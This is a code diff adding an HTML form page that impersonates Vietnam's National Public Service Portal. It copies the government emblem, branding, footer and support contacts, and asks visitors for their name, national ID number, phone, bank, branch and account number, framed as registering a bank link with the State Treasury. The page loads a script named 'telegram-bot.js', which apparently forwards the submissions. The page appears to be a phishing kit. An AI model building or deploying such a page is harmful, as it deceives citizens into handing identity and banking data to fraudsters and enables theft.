@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Ký Liên Kết Đồng Bộ Ngân Hàng - Cổng Dịch vụ công quốc gia</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Main Header -->
+    <header class="main-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <img src="logo.png" alt="Logo Cổng Dịch vụ công quốc gia" class="logo" onerror="this.onerror=null; this.src='logo.svg'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" onload="this.nextElementSibling.style.display='none';">
+                    <div class="logo-placeholder" id="logoPlaceholder">
+                        <div class="logo-emblem">
+                            <svg width="90" height="90" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <defs>
+                                    <linearGradient id="redGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                        <stop offset="0%" style="stop-color:#DC143C;stop-opacity:1" />
+                                        <stop offset="100%" style="stop-color:#B22222;stop-opacity:1" />
+                                    </linearGradient>
+                                </defs>
+                                <circle cx="50" cy="50" r="48" fill="url(#redGrad)" stroke="#FFD700" stroke-width="2"/>
+                                <path d="M 50 12 L 56 35 L 80 35 L 60 48 L 68 72 L 50 58 L 32 72 L 40 48 L 20 35 L 44 35 Z" fill="#FFD700" stroke="#FFA500" stroke-width="0.5"/>
+                                <path d="M 18 45 Q 12 40, 15 35 Q 18 30, 22 35 Q 20 40, 18 45" fill="#FFD700" opacity="0.95"/>
+                                <path d="M 15 50 Q 10 45, 13 40 Q 16 35, 20 40 Q 18 45, 15 50" fill="#FFD700" opacity="0.9"/>
+                                <path d="M 82 45 Q 88 40, 85 35 Q 82 30, 78 35 Q 80 40, 82 45" fill="#FFD700" opacity="0.95"/>
+                                <path d="M 85 50 Q 90 45, 87 40 Q 84 35, 80 40 Q 82 45, 85 50" fill="#FFD700" opacity="0.9"/>
+                                <circle cx="50" cy="68" r="14" fill="#FFD700" stroke="#FFA500" stroke-width="0.5"/>
+                                <circle cx="50" cy="68" r="10" fill="#DC143C" opacity="0.3"/>
+                                <rect x="48" y="54" width="4" height="10" fill="#DC143C" rx="1"/>
+                                <rect x="48" y="72" width="4" height="10" fill="#DC143C" rx="1"/>
+                                <rect x="60" y="66" width="10" height="4" fill="#DC143C" rx="1"/>
+                                <rect x="30" y="66" width="10" height="4" fill="#DC143C" rx="1"/>
+                                <rect x="56" y="60" width="6" height="4" fill="#DC143C" rx="1" transform="rotate(45 59 62)"/>
+                                <rect x="38" y="60" width="6" height="4" fill="#DC143C" rx="1" transform="rotate(-45 41 62)"/>
+                                <rect x="22" y="80" width="56" height="14" fill="#DC143C" rx="2" stroke="#FFD700" stroke-width="0.5"/>
+                                <text x="50" y="90" font-size="8" fill="#FFFFFF" text-anchor="middle" font-weight="bold" font-family="Arial, sans-serif">VIỆT NAM</text>
+                            </svg>
+                        </div>
+                        <div class="logo-text-content">
+                            <div class="logo-main-text">
+                                <span class="logo-styled-c">
+                                    <svg width="35" height="35" viewBox="0 0 40 40" style="vertical-align: baseline; margin-right: 2px;">
+                                        <path d="M 20 5 Q 5 5, 5 20 Q 5 35, 20 35" stroke="#8B4513" stroke-width="3" fill="none" stroke-linecap="round"/>
+                                        <path d="M 15 10 L 20 15 L 15 20" stroke="#8B4513" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                                        <line x1="8" y1="12" x2="12" y2="12" stroke="#8B4513" stroke-width="1.5"/>
+                                        <line x1="8" y1="18" x2="12" y2="18" stroke="#8B4513" stroke-width="1.5"/>
+                                        <line x1="8" y1="24" x2="12" y2="24" stroke="#8B4513" stroke-width="1.5"/>
+                                    </svg>
+                                </span>ỔNG DỊCH VỤ CÔNG QUỐC GIA
+                            </div>
+                            <div class="logo-tagline">Kết nối, cung cấp thông tin và dịch vụ công mọi lúc, mọi nơi</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <a href="index.html" class="btn-login">Về trang chủ</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <div class="appointment-section" style="max-width: 800px; margin: 40px auto;">
+                <div class="section-card">
+                    <div class="section-card-header">
+                        <h2 class="section-card-title">Đăng Ký Liên Kết Đồng Bộ Số Tài Khoản và Ngân Hàng</h2>
+                    </div>
+                    <form id="bankSyncForm" class="appointment-form">
+                        <div class="form-group">
+                            <label for="syncFullName">Họ và Tên <span class="required">*</span></label>
+                            <input type="text" id="syncFullName" name="syncFullName" required>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="syncIdNumber">Số CMND/CCCD <span class="required">*</span></label>
+                                <input type="text" id="syncIdNumber" name="syncIdNumber" required pattern="[0-9]{9,12}">
+                                <small>Nhập 9-12 chữ số</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="syncPhone">Số Điện Thoại <span class="required">*</span></label>
+                                <input type="tel" id="syncPhone" name="syncPhone" required pattern="[0-9]{10,11}">
+                                <small>Nhập 10-11 chữ số</small>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="syncEmail">Email</label>
+                            <input type="email" id="syncEmail" name="syncEmail">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="bankName">Tên Ngân Hàng <span class="required">*</span></label>
+                            <select id="bankName" name="bankName" required>
+                                <option value="">-- Chọn Ngân Hàng --</option>
+                                <option value="Vietcombank">Vietcombank (Ngân hàng Ngoại thương Việt Nam)</option>
+                                <option value="BIDV">BIDV (Ngân hàng Đầu tư và Phát triển Việt Nam)</option>
+                                <option value="VietinBank">VietinBank (Ngân hàng Công thương Việt Nam)</option>
+                                <option value="Agribank">Agribank (Ngân hàng Nông nghiệp và Phát triển Nông thôn)</option>
+                                <option value="ACB">ACB (Ngân hàng Á Châu)</option>
+                                <option value="Techcombank">Techcombank (Ngân hàng Kỹ thương Việt Nam)</option>
+                                <option value="VPBank">VPBank (Ngân hàng Việt Nam Thịnh Vượng)</option>
+                                <option value="MBBank">MBBank (Ngân hàng Quân đội)</option>
+                                <option value="TPBank">TPBank (Ngân hàng Tiên Phong)</option>
+                                <option value="Sacombank">Sacombank (Ngân hàng Sài Gòn Thương Tín)</option>
+                                <option value="HDBank">HDBank (Ngân hàng Phát triển Thành phố Hồ Chí Minh)</option>
+                                <option value="VIB">VIB (Ngân hàng Quốc tế Việt Nam)</option>
+                                <option value="SHB">SHB (Ngân hàng Sài Gòn - Hà Nội)</option>
+                                <option value="Eximbank">Eximbank (Ngân hàng Xuất Nhập khẩu Việt Nam)</option>
+                                <option value="MSB">MSB (Ngân hàng Hàng Hải)</option>
+                                <option value="OCB">OCB (Ngân hàng Phương Đông)</option>
+                                <option value="SeABank">SeABank (Ngân hàng Đông Nam Á)</option>
+                                <option value="VietABank">VietABank (Ngân hàng Việt Á)</option>
+                                <option value="PGBank">PGBank (Ngân hàng Xăng dầu Petrolimex)</option>
+                                <option value="ABBank">ABBank (Ngân hàng An Bình)</option>
+                                <option value="BacABank">BacABank (Ngân hàng Bắc Á)</option>
+                                <option value="NamABank">NamABank (Ngân hàng Nam Á)</option>
+                                <option value="SCB">SCB (Ngân hàng Sài Gòn)</option>
+                                <option value="Kienlongbank">Kienlongbank (Ngân hàng Kiên Long)</option>
+                                <option value="PVcomBank">PVcomBank (Ngân hàng Đại Chúng Việt Nam)</option>
+                                <option value="PublicBank">PublicBank (Ngân hàng Public Việt Nam)</option>
+                                <option value="OceanBank">OceanBank (Ngân hàng Đại Dương)</option>
+                                <option value="NCB">NCB (Ngân hàng Quốc Dân)</option>
+                                <option value="GPBank">GPBank (Ngân hàng Dầu Khí Toàn Cầu)</option>
+                                <option value="BacABank">BacABank (Ngân hàng Bắc Á)</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="bankBranch">Chi Nhánh Ngân Hàng <span class="required">*</span></label>
+                            <input type="text" id="bankBranch" name="bankBranch" required placeholder="Ví dụ: Chi nhánh Hà Nội, Chi nhánh TP.HCM...">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountNumber">Số Tài Khoản <span class="required">*</span></label>
+                            <input type="text" id="accountNumber" name="accountNumber" required pattern="[0-9]{8,20}" placeholder="Nhập số tài khoản ngân hàng">
+                            <small>Nhập 8-20 chữ số</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="accountHolderName">Tên Chủ Tài Khoản <span class="required">*</span></label>
+                            <input type="text" id="accountHolderName" name="accountHolderName" required placeholder="Tên chủ tài khoản (phải khớp với tên trên tài khoản)">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="syncNotes">Ghi Chú</label>
+                            <textarea id="syncNotes" name="syncNotes" rows="3" placeholder="Thông tin bổ sung (nếu có)..."></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="syncAgreement" name="syncAgreement" required>
+                                <label for="syncAgreement">Tôi đồng ý với các điều khoản và điều kiện liên kết đồng bộ tài khoản ngân hàng với kho bạc nhà nước <span class="required">*</span></label>
+                            </div>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="submit" class="btn btn-primary">Đăng Ký Liên Kết</button>
+                            <a href="index.html" class="btn btn-secondary" style="text-decoration: none; text-align: center;">Hủy</a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <p><strong>Cơ quan chủ quản:</strong> Văn phòng Chính phủ</p>
+                    <p><strong>www.dichvucong.gov.vn</strong></p>
+                    <p><strong>Tổng đài hỗ trợ:</strong> 18001096</p>
+                    <p><strong>Email:</strong> dichvucong@chinhphu.vn</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="notification" class="notification"></div>
+
+    <script src="telegram-bot.js"></script>
+    <script src="bank-sync-script.js"></script>
+</body>
+</html>
+
